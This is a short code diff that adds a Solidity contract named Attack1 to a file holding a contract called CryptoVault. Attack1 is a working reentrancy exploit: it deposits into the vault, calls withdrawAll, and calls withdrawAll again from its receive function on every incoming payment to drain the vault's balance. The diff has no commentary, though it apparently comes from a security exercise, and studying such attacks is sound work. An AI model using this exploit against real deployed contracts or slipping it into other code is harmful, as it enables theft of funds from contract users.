@@ -106,3 +106,26 @@ contract CryptoVault {
     }
 }
 
+contract Attack1 {
+
+    CryptoVault cv;
+
+    constructor(address _cv) public{
+        cv = CryptoVault(payable (_cv));
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1);
+        cv.deposit();
+        cv.withdrawAll();
+    }
+
+    receive() external payable {
+        cv.withdrawAll();
+    }
+
+    function getbalance() public view returns(uint){
+        return address (this).balance;
+    }
+}
+
